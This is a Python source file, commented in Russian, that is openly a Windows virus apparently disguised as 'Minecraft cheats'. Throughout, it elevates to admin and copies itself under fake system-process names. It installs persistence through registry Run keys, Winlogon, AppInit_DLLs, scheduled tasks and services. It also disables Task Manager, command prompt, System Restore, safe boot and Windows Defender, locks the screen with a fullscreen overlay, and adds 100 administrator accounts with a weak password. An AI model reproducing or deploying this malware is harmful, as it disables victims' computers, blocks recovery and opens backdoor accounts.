import os
import sys
import ctypes
import winreg
import subprocess
import time
import threading
import random
import shutil
import getpass
import re
from tkinter import Tk, Label, Button, Frame

# ============ ПРОВЕРКА ПРАВ АДМИНА ============
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

run_as_admin()

# ============ СКРЫТИЕ КОНСОЛИ ============
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ============ ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ============
CURRENT_EXE = sys.argv[0]
USER_NAME = getpass.getuser()
SYSTEM32 = os.environ['SystemRoot'] + "\\System32"
WINDOWS = os.environ['SystemRoot']
TEMP = os.environ['TEMP']
PROGRAMFILES = os.environ['ProgramFiles']
APPDATA = os.environ['APPDATA']
COMMON_APPDATA = os.environ['ProgramData']
STARTUP = APPDATA + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
DRIVES = [d + ":\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(d + ":\\")]

# Копии будут иметь эти имена (системные)
FAKE_NAMES = ["svchost.exe", "winlogon.exe", "csrss.exe", "services.exe", "lsass.exe", "explorer.exe"]

# ============ 1. РАСПРОСТРАНЕНИЕ КОПИЙ ПО ВСЕЙ СИСТЕМЕ ============
def spread_copies():
    """Копирует себя во все возможные папки с разными именами."""
    copies_created = []
    # Системные папки
    folders = [
        SYSTEM32, WINDOWS, TEMP, PROGRAMFILES, 
        APPDATA, COMMON_APPDATA, STARTUP,
        os.environ['USERPROFILE'] + "\\Desktop",
        os.environ['USERPROFILE'] + "\\Documents",
        os.environ['USERPROFILE'] + "\\Downloads"
    ]
    # Добавляем корни всех дисков
    for drive in DRIVES:
        folders.append(drive + "Windows")
        folders.append(drive + "Program Files")
        folders.append(drive + "Temp")
        folders.append(drive + "Users\\Public")
    # Создаём копии
    for folder in folders:
        if not os.path.exists(folder):
            try:
                os.makedirs(folder)
            except:
                continue
        # Копируем с разными именами
        for _ in range(3):  # по 3 копии в каждой папке
            name = random.choice(FAKE_NAMES)
            if random.random() > 0.5:
                name = f"sys_{random.randint(1000,9999)}.exe"
            dest = folder + "\\" + name
            try:
                shutil.copy2(CURRENT_EXE, dest)
                # Скрываем файл
                subprocess.run(f'attrib +h "{dest}"', shell=True, capture_output=True)
                copies_created.append(dest)
            except:
                pass
    return copies_created

# ============ 2. МНОЖЕСТВО АВТОЗАГРУЗОК ============
def add_to_startup():
    """Добавляет вирус во все возможные места автозапуска."""
    exe_path = CURRENT_EXE
    # 2.1. Папка Startup
    try:
        shutil.copy2(exe_path, STARTUP + "\\winupdate.exe")
        subprocess.run(f'attrib +h "{STARTUP}\\winupdate.exe"', shell=True)
    except:
        pass
    # 2.2. Реестр: Run, RunOnce, RunServices, Policies\Explorer\Run
    reg_paths = [
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
    ]
    for hkey, path in reg_paths:
        try:
            key = winreg.CreateKey(hkey, path)
            winreg.SetValueEx(key, "SystemHelper", 0, winreg.REG_SZ, exe_path)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
            winreg.SetValueEx(key, "MicrosoftEdge", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
        except:
            pass
    # 2.3. Winlogon (запуск до входа)
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "Shell", 0, winreg.REG_SZ, f"explorer.exe, {exe_path}")
        winreg.CloseKey(key)
    except:
        pass
    # 2.4. AppInit_DLLs (загрузка при каждом запуске .exe)
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "AppInit_DLLs", 0, winreg.REG_SZ, exe_path)
        winreg.SetValueEx(key, "LoadAppInit_DLLs", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass
    # 2.5. Планировщик задач (запуск каждые 5 минут и при старте)
    try:
        subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "{exe_path}" /sc onstart /f', shell=True)
        subprocess.run(f'schtasks /create /tn "SystemCheck" /tr "{exe_path}" /sc minute /mo 5 /f', shell=True)
        subprocess.run(f'schtasks /create /tn "MicrosoftEdgeUpdate" /tr "{exe_path}" /sc onlogon /f', shell=True)
    except:
        pass
    # 2.6. Служба (через sc)
    try:
        subprocess.run(f'sc create "SysHelper" binPath= "{exe_path}" start= auto', shell=True)
        subprocess.run(f'sc create "WinUpdateSvc" binPath= "{exe_path}" start= auto', shell=True)
    except:
        pass
    # 2.7. Групповая политика (запуск при старте)
    try:
        subprocess.run(f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup" /v 0 /t REG_SZ /d "{exe_path}" /f', shell=True)
    except:
        pass
    # 2.8. Active Setup (запуск при первом входе нового пользователя)
    try:
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Active Setup\Installed Components\{A123B456-C789-D012-E345-F6789ABCDEF0}")
        winreg.SetValueEx(key, "StubPath", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except:
        pass

# ============ 3. БЛОКИРОВКА СИСТЕМНЫХ ИНСТРУМЕНТОВ ============
def block_system_tools():
    """Блокирует диспетчер задач, реестр, командную строку, PowerShell, редактор групповой политики, восстановление."""
    # 3.1. Отключение TaskMgr, Regedit, CMD, PowerShell
    policies = {
        "DisableTaskMgr": 1,
        "DisableRegistryTools": 1,
        "DisableCMD": 1,  # отключает cmd и bat
        "DisablePowerShell": 1,  # через реестр
        "HideRunAs": 1,  # скрывает "Запуск от имени"
    }
    for name, val in policies.items():
        try:
            subprocess.run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v {name} /t REG_DWORD /d {val} /f', shell=True)
            subprocess.run(f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v {name} /t REG_DWORD /d {val} /f', shell=True)
        except:
            pass
    # 3.2. Блокировка доступа к диспетчеру задач через параметры безопасности
    try:
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoTaskMgr /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoTaskMgr /t REG_DWORD /d 1 /f', shell=True)
    except:
        pass
    # 3.3. Отключение восстановления системы
    try:
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f', shell=True)
    except:
        pass
    # 3.4. Отключение среды восстановления и безопасного режима
    try:
        subprocess.run('bcdedit /set {default} recoveryenabled No', shell=True)
        subprocess.run('bcdedit /set {default} bootmenupolicy Legacy', shell=True)
        subprocess.run('bcdedit /deletevalue {default} safeboot', shell=True, stderr=subprocess.DEVNULL)
        # Заблокировать F8 (расширенные параметры)
        subprocess.run('bcdedit /set {default} advancedoptions No', shell=True)
    except:
        pass
    # 3.5. Отключение Windows Defender (если есть)
    try:
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Paths" /v "C:\\" /t REG_DWORD /d 0 /f', shell=True)
    except:
        pass
    # 3.6. Блокировка Ctrl+Alt+Del, Alt+F4, Win, Alt+Tab, Ctrl+Esc
    try:
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableChangePassword /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v AltTabSettings /t REG_DWORD /d 1 /f', shell=True)
        # Блокировка Alt+F4 через отключение системного меню окон
        subprocess.run('reg add "HKCU\\Control Panel\\Desktop" /v AutoEndTasks /t REG_SZ /d "1" /f', shell=True)
    except:
        pass
    # 3.7. Скрыть все системные инструменты из меню Пуск
    try:
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoSetFolders /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoFind /t REG_DWORD /d 1 /f', shell=True)
    except:
        pass

# ============ 4. СОЗДАНИЕ ФЕЙКОВЫХ ФАЙЛОВ (ЛОВУШКИ) ============
def create_fake_files():
    """Создаёт множество фейковых файлов с именами, имитирующими важные документы."""
    folders = [os.environ['USERPROFILE'] + "\\Desktop", os.environ['USERPROFILE'] + "\\Documents", TEMP]
    for folder in folders:
        if not os.path.exists(folder):
            continue
        for i in range(50):
            name = f"passwords_{random.randint(1,999)}.txt"
            content = f"This is a fake file #{i}\n" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=200))
            with open(folder + "\\" + name, "w") as f:
                f.write(content)
    # Также создаём много папок с вложенными файлами
    for i in range(20):
        dir_name = TEMP + "\\temp_" + str(random.randint(1000,9999))
        try:
            os.makedirs(dir_name)
            for j in range(10):
                with open(dir_name + f"\\file_{j}.dat", "wb") as f:
                    f.write(os.urandom(1024))  # случайный мусор
        except:
            pass

# ============ 5. САМОВОССТАНОВЛЕНИЕ (WATCHDOG) ============
def watchdog():
    """Запускает несколько процессов-стражей, которые перезапускают основной вирус при его завершении."""
    # Запускаем 3 сторожевых процесса (каждый следит за остальными)
    for i in range(3):
        subprocess.Popen(f'start /b python -c "import time, subprocess, sys; exe=r\"{CURRENT_EXE}\"; while True: time.sleep(5);        
        subprocess.Popen(exe, shell=True)"', shell=True)
    # Также добавляем в планировщик задание на перезапуск каждые 2 минуты
    try:
        subprocess.run(f'schtasks /create /tn "Watchdog" /tr "{CURRENT_EXE}" /sc minute /mo 2 /f', shell=True)
    except:
        pass

# ============ 6. ЭФФЕКТ ПЕРЕЛИВАЮЩИХСЯ ЦВЕТОВ (ПОВЕРХ ВСЕГО) ============
def color_animation():
    root = Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.overrideredirect(True)
    root.config(cursor="none")
    root.focus_force()
    
    colors = ['#FF0000', '#FF7F00', '#FFFF00', '#00FF00', '#0000FF', '#8B00FF']
    label = Label(root, text="", font=("Arial", 80, "bold"))
    label.pack(expand=True)
    
    def change_color(index=0):
        color = colors[index % len(colors)]
        root.configure(bg=color)
        label.configure(text="MINECRAFT CHEATS", fg='white', bg=color)
        root.after(200, change_color, index+1)
    
    change_color()
    root.mainloop()

# ============ 7. БЛОКИРОВКА ЗАКРЫТИЯ ОКНА ============
def block_close():
    """Запускает бесконечный цикл, который пересоздаёт окно анимации, если оно закрыто."""
    while True:
        # Проверяем, запущен ли процесс анимации (по заголовку или PID)
        # Для простоты просто перезапускаем каждые 10 секунд
        time.sleep(10)
        # Здесь можно проверить, существует ли процесс python с окном, но проще перезапустить
        threading.Thread(target=color_animation, daemon=True).start()

# ============ 8. СОЗДАНИЕ МНОЖЕСТВА ПОЛЬЗОВАТЕЛЕЙ (для массовости) ============
def create_users():
    for i in range(100):
        try:
            username = f"ХАХАХАХАХА{i}"
            subprocess.run(f"net user {username} 123456 /add", shell=True)
            subprocess.run(f"net localgroup administrators {username} /add", shell=True)
        except:
            pass

# ============ 9. ГЛАВНАЯ ФУНКЦИЯ (ЗАПУСК ВСЕГО) ============
def main():
    # 1. Распространяем копии
    spread_copies()
    # 2. Добавляем автозагрузки
    add_to_startup()
    # 3. Блокируем системные инструменты и восстановление
    block_system_tools()
    # 4. Создаём фейковые файлы
    threading.Thread(target=create_fake_files, daemon=True).start()
    # 5. Запускаем сторожевые процессы
    watchdog()
    # 6. Запускаем анимацию в отдельном потоке
    threading.Thread(target=color_animation, daemon=True).start()
    # 7. Запускаем блокировку закрытия (чтобы анимация не завершалась)
    threading.Thread(target=block_close, daemon=True).start()
    # 8. Создаём пользователей в фоне
    threading.Thread(target=create_users, daemon=True).start()
    # 9. Бесконечный цикл, чтобы программа не завершилась
    while True:
        time.sleep(60)

if __name__ == "__main__":
    main()